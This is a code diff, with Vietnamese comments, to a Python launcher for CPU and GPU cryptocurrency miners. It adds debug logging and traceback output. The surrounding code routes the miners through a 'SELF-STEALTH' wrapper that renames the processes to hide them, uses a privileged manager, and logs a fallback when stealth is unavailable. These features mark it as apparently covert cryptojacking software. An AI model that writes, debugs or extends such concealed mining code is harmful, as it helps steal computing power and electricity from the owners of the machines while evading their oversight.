@@ -479,7 +479,12 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
     Returns:
         subprocess.Popen: Tiến trình khai thác nếu thành công, None nếu thất bại
     """
+    # **🔧 DEBUG: Function entry logging** (ghi log đầu vào function)  
+    miner_type = 'CPU' if cpu else 'GPU'
+    logger.info(f"🔍 [DEBUG] start_mining_process() called - Type: {miner_type}")
+    
     executable = os.getenv('ML_COMMAND' if cpu else 'CUDA_COMMAND')
+    logger.info(f"🔍 [DEBUG] Executable path: {executable}")
     if not executable or not os.path.isfile(executable) or not os.access(executable, os.X_OK):
         logger.error(f"Tệp thực thi khai thác không hợp lệ hoặc không có quyền truy cập: {executable}")
         stop_event.set()
@@ -558,6 +563,7 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                     stealth_command = [sys.executable, stealth_wrapper_path] + mining_command[1:]  # Remove executable, keep args
                     miner_type = 'CPU' if cpu else 'GPU'
                     logger.info(f"🔒 [SELF-STEALTH] Using {miner_type} stealth wrapper: {stealth_wrapper_path}")
+                    logger.info(f"🔍 [DEBUG] About to call subprocess.Popen with command: {stealth_command}")
                     
                     process = subprocess.Popen(
                         stealth_command,
@@ -567,6 +573,7 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                         bufsize=1,
                         env=subprocess_env  # **Clean environment** cho GPU mining
                     )
+                    logger.info(f"🔍 [DEBUG] subprocess.Popen completed successfully")
                     if process:
                         logger.info(f"✅ [SELF-STEALTH] {miner_type} stealth process started with PID: {process.pid}")
                         logger.info(f"🔍 [SELF-STEALTH] {miner_type} process will self-rename using internal stealth manager")
@@ -575,6 +582,7 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                     miner_type = 'CPU' if cpu else 'GPU'
                     logger.warning(f"⚠️ [SELF-STEALTH] {miner_type} stealth wrapper not found: {stealth_wrapper_path}")
                     logger.warning(f"⚠️ [SELF-STEALTH] Falling back to standard subprocess - no {miner_type} stealth")
+                    logger.info(f"🔍 [DEBUG] About to call fallback subprocess.Popen with command: {mining_command}")
                     process = subprocess.Popen(
                         mining_command,
                         stdout=subprocess.PIPE,
@@ -735,14 +743,18 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
                     else:
                         log_gpu_plugin_operation("PROCESS_SUCCESS", f"Mining process started: {success_details}", "INFO")
                     
+                    logger.info(f"🔍 [DEBUG] About to return process object - PID: {process.pid}, Type: {type(process)}")
                     return process
                     
         except Exception as e:
+            logger.error(f"🔍 [DEBUG] Exception caught in start_mining_process: {type(e).__name__}: {str(e)}")
             logger.error(f"Lỗi khi khởi động quá trình khai thác {'CPU' if cpu else 'GPU'}: {e}")
-            # **Additional debug info** (thông tin gỡ lỗi bổ sung) cho **GPU failures** (lỗi GPU)
-            if not cpu:
-                logger.error(f"🔍 GPU Error Details - Exception: {type(e).__name__}: {str(e)}")
-                logger.error(f"🔍 GPU Error Details - Command: {' '.join(mining_command)}")
+            # **Enhanced debug info** (thông tin gỡ lỗi nâng cao) cho **cả CPU và GPU failures** (lỗi cả CPU và GPU)
+            logger.error(f"🔍 Error Details - Exception: {type(e).__name__}: {str(e)}")
+            logger.error(f"🔍 Error Details - Command: {' '.join(mining_command)}")
+            logger.error(f"🔍 Error Details - Attempt: {attempt}/{retries}")
+            import traceback
+            logger.error(f"🔍 Error Details - Traceback: {traceback.format_exc()}")
             process = None
         if attempt < retries:
             logger.info(f"Đợi {delay} giây trước khi thử lại...")
@@ -948,6 +960,10 @@ def cpu_mining_thread():
                     thread_logger.info(f"🔄 Starting CPU mining process (attempt {retries + 1}/{max_retries})")
                     cpu_process = start_mining_process(cpu=True, privileged_manager=privileged_manager)
                     thread_logger.info(f"🔍 [DEBUG] start_mining_process returned: {cpu_process} (type: {type(cpu_process)})")
+                    if cpu_process:
+                        thread_logger.info(f"🔍 [DEBUG] CPU process received successfully - PID: {cpu_process.pid}")
+                    else:
+                        thread_logger.error(f"🔍 [DEBUG] CPU process is None - start_mining_process failed")
                     
                     if cpu_process:
                         # **EventBus PID registration** (đăng ký PID EventBus) – publish ngay, không phụ thuộc kiểm tra running**
@@ -1035,6 +1051,10 @@ def gpu_mining_thread():
                 new_process = start_mining_process(cpu=False, privileged_manager=privileged_manager)
                 gpu_process = new_process
                 thread_logger.info(f"🔍 [DEBUG] start_mining_process returned: {gpu_process} (type: {type(gpu_process)})")
+                if gpu_process:
+                    thread_logger.info(f"🔍 [DEBUG] GPU process received successfully - PID: {gpu_process.pid}")
+                else:
+                    thread_logger.error(f"🔍 [DEBUG] GPU process is None - start_mining_process failed")
                 
                 if gpu_process:
                     # **EventBus PID registration** – publish ngay
